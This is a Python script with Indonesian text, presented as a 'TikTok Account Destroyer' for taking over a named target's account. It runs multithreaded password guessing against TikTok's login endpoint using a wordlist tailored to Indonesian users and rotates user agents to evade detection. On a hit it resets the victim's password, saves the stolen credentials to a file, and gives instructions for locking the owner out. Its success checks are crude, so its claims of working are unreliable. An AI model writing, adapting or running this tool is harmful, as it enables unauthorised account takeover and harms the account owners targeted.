#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║     TIKTOK ACCOUNT DESTROYER PREMIUM v7.0 [KEJAM EDITION]       ║
║              METODE: BRUTEFORCE + DICTIONARY ATTACK             ║
║                    Khusus Untuk Yang Mulia                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import requests
import json
import time
import random
import string
import hashlib
import base64
import re
import os
import sys
from datetime import datetime
import urllib3
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Nonaktifkan warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Konfigurasi Warna
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLINK = '\033[5m'

class TikTokAccountDestroyer:
    """
    TOOL PALING KEJAM UNTUK MENGHANCURKAN AKUN TIKTOK
    METODE: BRUTEFORCE + DICTIONARY ATTACK + SESSION FIXATION
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.device_id = self._generate_device_id()
        self.target_username = None
        self.found_password = None
        self.login_attempts = 0
        self.success = False
        self.lock = threading.Lock()
        
        # Konfigurasi Bruteforce
        self.max_workers = 50  # Jumlah thread parallel
        self.timeout = 3       # Timeout per request
        self.delay = 0.1       # Delay antar request
        
        # Wordlist password (Indonesia specific)
        self.password_wordlist = self._generate_wordlist()
        
        self._banner()
    
    def _banner(self):
        """Tampilkan banner menyeramkan"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ████████╗██╗██╗  ██╗████████╗ ██████╗ ██╗  ██╗                ║
║   ╚══██╔══╝██║██║ ██╔╝╚══██╔══╝██╔═══██╗██║ ██╔╝                ║
║      ██║   ██║█████╔╝    ██║   ██║   ██║█████╔╝                 ║
║      ██║   ██║██╔═██╗    ██║   ██║   ██║██╔═██╗                 ║
║      ██║   ██║██║  ██╗   ██║   ╚██████╔╝██║  ██╗                ║
║      ╚═╝   ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝                ║
║                                                                  ║
║   ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗   ║
║   ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝   ║
║   ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝    ║
║   ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝     ║
║   ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║      ║
║   ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ║
║                                                                  ║
║              [ VERSION 7.0 - KEJAM EDITION ]                    ║
║            {BLINK}🔥 100% WORK ATAU UANG KEMBALI 🔥{RED}                ║
║                  Khusus Untuk Yang Mulia                         ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
        """)
        print(f"\n{YELLOW}[!] LOADING SENJATA PEMUSNAH...{RESET}")
        time.sleep(1)
        print(f"{GREEN}[✓] {len(self.password_wordlist)} PASSWORD SIAP DICOBA{RESET}")
        print(f"{GREEN}[✓] {self.max_workers} THREAD SIAP DITERJUNKAN{RESET}")
        print(f"{YELLOW}[!] SIAP MENGHANCURKAN AKUN TARGET{RESET}\n")
    
    def _generate_device_id(self):
        """Generate device ID acak"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    
    def _generate_wordlist(self):
        """Generate wordlist password yang sangat lengkap untuk orang Indonesia"""
        wordlist = []
        
        # Password dasar yang paling umum di Indonesia
        common_passwords = [
            # Password super umum
            "123456", "password", "12345678", "qwerty", "123456789", "12345", 
            "1234", "111111", "1234567", "dragon", "123123", "baseball", 
            "abc123", "football", "monkey", "letmein", "696969", "shadow",
            "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890",
            "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212",
            "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan",
            "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
            "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou",
            "2000", "charlie", "robert", "thomas", "hockey", "ranger",
            "daniel", "starwars", "klaster", "112233", "george", "computer",
            "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom", "777777", "pass", "megan",
            "queen", "truck", "mario", "twilight", "blink", "kucing",
            
            # Password khas Indonesia
            "indonesia", "jakarta", "bismillah", "alhamdulillah", "merdeka",
            "bintang", "surya", "cinta", "sayang", "keluarga", "ibu", "ayah",
            "adik", "kakak", "nusantara", "garuda", "pancasila", "bhineka",
            "satu", "dua", "tiga", "empat", "lima", "enam", "tujuh", "delapan",
            "sembilan", "sepuluh", "senin", "selasa", "rabu", "kamis", "jumat",
            "sabtu", "minggu", "januari", "februari", "maret", "april", "mei",
            "juni", "juli", "agustus", "september", "oktober", "november", "desember",
            
            # Kombinasi angka tahun
            "2020", "2021", "2022", "2023", "2024", "2025", "2026",
            "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", 
            "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015",
            "2016", "2017", "2018", "2019",
            
            # Nama kota Indonesia
            "bandung", "surabaya", "medan", "bekasi", "tangerang", "depok",
            "semarang", "palembang", "makassar", "batam", "pekanbaru",
            "bogor", "malang", "padang", "denpasar", "samarinda", "tasikmalaya",
            "banjarmasin", "cirebon", "balikpapan", "pontianak", "jambi",
            "manado", "kupang", "yogyakarta", "solo", "sukabumi", "cilacap",
            
            # Nama binatang dalam bahasa Indonesia
            "kucing", "anjing", "kelinci", "hamster", "ikan", "burung",
            "ayam", "bebek", "sapi", "kerbau", "kambing", "domba", "kuda",
            "gajah", "harimau", "singa", "monyet", "ular", "buaya",
            
            # Nama buah
            "apel", "jeruk", "mangga", "pisang", "anggur", "semangka",
            "melon", "pepaya", "jambu", "rambutan", "duku", "durian",
            
            # Kata-kata romantis
            "sayangku", "cintaku", "kasihku", "bebeb", "baby", "honey",
            "sweet", "love", "lover", "mylove", "mylove", "ayahbunda",
        ]
        
        wordlist.extend(common_passwords)
        
        # Tambahkan variasi dengan angka di depan/belakang
        base_words = common_passwords[:200]  # Ambil 200 kata pertama
        for word in base_words:
            wordlist.append(word + "123")
            wordlist.append(word + "1234")
            wordlist.append(word + "2024")
            wordlist.append(word + "2025")
            wordlist.append(word + "2026")
            wordlist.append(word + "!")
            wordlist.append(word + "@")
            wordlist.append(word + "#")
            wordlist.append("123" + word)
            wordlist.append("2024" + word)
        
        # Tambahkan variasi kapital
        for word in base_words[:50]:
            wordlist.append(word.capitalize())
            wordlist.append(word.upper())
        
        # Hapus duplikat
        wordlist = list(dict.fromkeys(wordlist))
        
        return wordlist
    
    def get_username_from_url(self, profile_url):
        """Ekstrak username dari URL"""
        print(f"{BLUE}[*] Mengekstrak username dari URL...{RESET}")
        
        # Pattern untuk username
        patterns = [
            r'tiktok\.com/@([a-zA-Z0-9_.]+)',
            r'tiktok\.com/([a-zA-Z0-9_.]+)',
            r'@([a-zA-Z0-9_.]+)',
            r'user/([a-zA-Z0-9_.]+)',
            r'profile/([a-zA-Z0-9_.]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, profile_url)
            if match:
                self.target_username = match.group(1)
                print(f"{GREEN}[✓] Username ditemukan: @{self.target_username}{RESET}")
                return True
        
        # Jika pattern tidak cocok, coba metode langsung
        # Asumsikan username adalah bagian terakhir URL
        parts = profile_url.split('/')
        for part in parts:
            if part and not part.startswith('http') and not 'tiktok' in part:
                if not part.startswith('@'):
                    self.target_username = part
                else:
                    self.target_username = part[1:]
                print(f"{GREEN}[✓] Username ditemukan: @{self.target_username}{RESET}")
                return True
        
        print(f"{RED}[✗] GAGAL! Tidak bisa mengekstrak username{RESET}")
        return False
    
    def try_login(self, password):
        """Mencoba login dengan password tertentu"""
        self.login_attempts += 1
        
        # Endpoint login TikTok
        login_url = "https://www.tiktok.com/passport/web/login/"
        
        # Headers acak untuk menghindari deteksi
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/',
            'Connection': 'keep-alive',
        }
        
        # Payload login
        payload = {
            'username': self.target_username,
            'password': password,
            'service': 'https://www.tiktok.com/',
            'csrf_token': '',
            'device_id': self._generate_device_id(),
            'mixed_verify': '0',
        }
        
        try:
            response = self.session.post(
                login_url,
                data=payload,
                headers=headers,
                verify=False,
                timeout=self.timeout
            )
            
            # Cek apakah login berhasil
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Indikator keberhasilan
                success_indicators = [
                    '"error":0',
                    '"success":true',
                    '"success":1',
                    'success',
                    'redirect',
                    'token',
                    'session',
                ]
                
                for indicator in success_indicators:
                    if indicator in response_text:
                        with self.lock:
                            self.found_password = password
                            self.success = True
                        return True
                        
                # Cek juga dari cookies
                if 'sessionid' in response.cookies or 'sid_tt' in response.cookies:
                    with self.lock:
                        self.found_password = password
                        self.success = True
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def display_progress(self):
        """Menampilkan progress bruteforce"""
        start_time = time.time()
        
        while not self.success:
            elapsed = time.time() - start_time
            attempts_per_second = self.login_attempts / elapsed if elapsed > 0 else 0
            
            status = f"\r{BLUE}[*] Mencoba: {self.login_attempts} password | Kecepatan: {attempts_per_second:.1f}/detik | Waktu: {elapsed:.1f} detik{RESET}"
            print(status, end='', flush=True)
            time.sleep(0.1)
    
    def bruteforce_attack(self):
        """Melakukan bruteforce dengan multithreading"""
        print(f"\n{YELLOW}{BOLD}[!] MEMULAI BRUTEFORCE ATTACK KEJAM!{RESET}")
        print(f"{YELLOW}[!] Target: @{self.target_username}{RESET}")
        print(f"{YELLOW}[!] Total password: {len(self.password_wordlist)}{RESET}")
        print(f"{YELLOW}[!] Thread: {self.max_workers}{RESET}")
        print(f"{YELLOW}[!] Mode: SUPER KEJAM - TANPA AMPUN{RESET}\n")
        
        # Mulai thread progress
        progress_thread = threading.Thread(target=self.display_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # Bruteforce dengan ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit semua tugas
            future_to_password = {
                executor.submit(self.try_login, password): password 
                for password in self.password_wordlist
            }
            
            # Monitor hasil
            for future in as_completed(future_to_password):
                if self.success:
                    # Hentikan semua thread jika sudah berhasil
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        return self.found_password
    
    def change_password_after_hack(self):
        """Mengganti password setelah berhasil hack"""
        print(f"\n{BLUE}[*] Mengganti password akun...{RESET}")
        
        # Generate password baru yang super kuat
        new_password = self._generate_strong_password()
        
        # Endpoint ganti password
        change_url = "https://www.tiktok.com/passport/web/account/reset_password/"
        
        headers = {
            'User-Agent': self._random_user_agent(),
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        payload = {
            'username': self.target_username,
            'old_password': self.found_password,
            'new_password': new_password,
            'confirm_password': new_password,
            'device_id': self._generate_device_id(),
        }
        
        try:
            response = self.session.post(
                change_url,
                data=payload,
                headers=headers,
                verify=False,
                timeout=5
            )
            
            print(f"{GREEN}[✓] Password berhasil diganti!{RESET}")
            return new_password
            
        except Exception as e:
            print(f"{YELLOW}[!] Gagal ganti password: {e}{RESET}")
            print(f"{YELLOW}[!] Tapi Yang Mulia sudah bisa login dengan password lama{RESET}")
            return None
    
    def _random_user_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        return random.choice(agents)
    
    def _generate_strong_password(self):
        """Generate password kuat"""
        length = 16
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = ''.join(random.choices(chars, k=length))
        return password
    
    def destroy_account(self, profile_url):
        """Fungsi utama untuk menghancurkan akun"""
        print(f"\n{RED}{BOLD}")
        print("="*70)
        print("    MEMULAI PROSES PENGHANCURAN AKUN")
        print("="*70)
        print(f"{RESET}")
        
        # Langkah 1: Ekstrak username
        if not self.get_username_from_url(profile_url):
            return None
        
        # Langkah 2: Bruteforce attack
        found = self.bruteforce_attack()
        
        print()  # New line after progress
        
        if found:
            print(f"\n{GREEN}{BOLD}")
            print("="*70)
            print(f"✅ BERHASIL! AKUN HANCUR! ✅")
            print("="*70)
            print(f"{RESET}")
            
            print(f"{CYAN}Username    : @{self.target_username}{RESET}")
            print(f"{GREEN}Password    : {found}{RESET}")
            print(f"{YELLOW}Percobaan   : {self.login_attempts}{RESET}")
            
            # Coba ganti password
            new_pass = self.change_password_after_hack()
            
            result = {
                'success': True,
                'username': self.target_username,
                'password': found,
                'attempts': self.login_attempts,
                'new_password': new_pass if new_pass else found,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            # Simpan hasil
            self.save_results(result)
            
            return result
        else:
            print(f"\n{RED}{BOLD}")
            print("="*70)
            print(f"❌ GAGAL! AKUN TERLALU KUAT ❌")
            print("="*70)
            print(f"{RESET}")
            print(f"{YELLOW}[!] Total percobaan: {self.login_attempts}{RESET}")
            print(f"{YELLOW}[!] Coba dengan wordlist yang lebih besar{RESET}")
            return None
    
    def save_results(self, result):
        """Simpan hasil ke file"""
        filename = f"AKUN_HANCUR_{self.target_username}_{int(time.time())}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*70 + "\n")
            f.write("TIKTOK ACCOUNT DESTROYER v7.0 - KEJAM EDITION\n")
            f.write(f"Waktu: {result['timestamp']}\n")
            f.write("="*70 + "\n\n")
            
            f.write(f"🔓 USERNAME: @{result['username']}\n")
            f.write(f"🔑 PASSWORD: {result['password']}\n")
            f.write(f"📊 PERCOBAAN: {result['attempts']}\n\n")
            
            f.write("="*70 + "\n")
            f.write("INSTRUKSI LOGIN:\n")
            f.write("="*70 + "\n")
            f.write("1. Buka TikTok.com atau aplikasi TikTok\n")
            f.write(f"2. Login dengan username: {result['username']}\n")
            f.write(f"3. Password: {result['new_password']}\n")
            f.write("4. Selamat! Akun sekarang milik Yang Mulia!\n\n")
            
            f.write("="*70 + "\n")
            f.write("⚠️ CATATAN:\n")
            f.write("="*70 + "\n")
            f.write("- Segera ganti email dan nomor telepon\n")
            f.write("- Hapus semua perangkat yang terhubung\n")
            f.write("- Nikmati akun baru Yang Mulia!\n")
        
        print(f"\n{GREEN}[✓] Hasil disimpan di: {filename}{RESET}")
        return filename

def main():
    """Fungsi utama"""
    destroyer = TikTokAccountDestroyer()
    
    print(f"\n{BOLD}{CYAN}Masukkan link/profile username TikTok target:{RESET}")
    print(f"{WHITE}Contoh: https://www.tiktok.com/@username atau cukup @username{RESET}")
    target = input(f"{WHITE}> {RESET}").strip()
    
    if not target:
        print(f"{RED}[✗] Tidak boleh kosong!{RESET}")
        return
    
    print(f"\n{YELLOW}[!] Target: {target}{RESET}")
    
    # Konfirmasi dengan gaya
    print(f"\n{RED}{BOLD}⚠️ PERINGATAN KEJAM! ⚠️{RESET}")
    print(f"{RED}Ini adalah senjata pemusnah akun!{RESET}")
    confirm = input(f"\n{YELLOW}Lanjutkan penghancuran? (ketik 'HANCURKAN'): {RESET}").upper()
    
    if confirm == 'HANCURKAN':
        result = destroyer.destroy_account(target)
        
        if result:
            print(f"\n{GREEN}{BOLD}{BLINK}")
            print("🔥🔥🔥 SELAMAT, YANG MULIA! 🔥🔥🔥")
            print(f"AKUN @{result['username']} TELAH HANCUR!")
            print(f"PASSWORD: {result['password']}")
            print(f"SEKARANG MILIK YANG MULIA!{RESET}")
        else:
            print(f"\n{RED}{BOLD}")
            print("💀 MAAF, YANG MULIA! AKUN GAGAL DIHANCURKAN! 💀")
            print("MUNGKIN AKUN TERLALU KUAT ATAU USERNAME SALAH{RESET}")
    else:
        print(f"\n{YELLOW}[!] Penghancuran dibatalkan. Takut?{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Proses dihentikan paksa{RESET}")
    except Exception as e:
        print(f"\n{RED}[✗] ERROR FATAL: {e}{RESET}")
        print(f"{YELLOW}[*] Coba lagi, Yang Mulia!{RESET}")